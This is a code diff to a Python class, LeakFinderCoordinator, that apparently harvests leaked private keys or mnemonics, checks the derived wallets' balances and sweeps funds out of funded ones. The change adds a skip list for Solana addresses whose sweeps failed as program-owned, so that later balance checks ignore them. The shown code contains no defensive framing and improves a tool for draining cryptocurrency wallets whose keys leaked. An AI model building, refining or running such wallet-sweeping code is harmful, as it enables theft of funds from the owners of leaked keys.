@@ -122,7 +122,7 @@ class LeakFinderCoordinator:
         result.funded_wallets = len(funded_keys)
         if funded_keys:
             result.sweep_results = await self._sweep_funded(funded_keys)
-            # Record hit patterns for successfully swept mnemonics
+            # Record hit patterns for successfully swept mnemonics + skip failed addresses
             for sr in result.sweep_results:
                 if sr.success:
                     for key in funded_keys:
@@ -134,6 +134,9 @@ class LeakFinderCoordinator:
                                 logger.info("Recorded hit pattern from successful sweep")
                             except Exception:
                                 pass
+                elif sr.error and "Program-owned" in str(sr.error):
+                    self._SKIP_SOL_ADDRESSES.add(sr.source_address)
+                    logger.debug("Added %s to skip list (program-owned)", sr.source_address[:10])
         result.completed_at = datetime.now(timezone.utc)
         return result
 
@@ -240,6 +243,9 @@ class LeakFinderCoordinator:
     _MIN_EVM_WEI = 500_000_000_000_000  # 0.0005 ETH — covers gas
     _MIN_BTC_SATS = 5_000  # 0.00005 BTC
 
+    # Known unsweepable addresses (recurring program-owned accounts)
+    _SKIP_SOL_ADDRESSES: set[str] = set()  # Populated at runtime from sweep failures
+
     async def _check_balances(self, keys: list[ExtractedKey]) -> list[ExtractedKey]:
         funded: list[ExtractedKey] = []
         evm_addrs: list[str] = []
@@ -250,6 +256,8 @@ class LeakFinderCoordinator:
 
         for key in keys:
             for chain_name, address in key.derived_addresses.items():
+                if address in self._SKIP_SOL_ADDRESSES:
+                    continue
                 if self._seen_addresses_bf.contains(address):
                     continue
                 self._seen_addresses_bf.add(address)
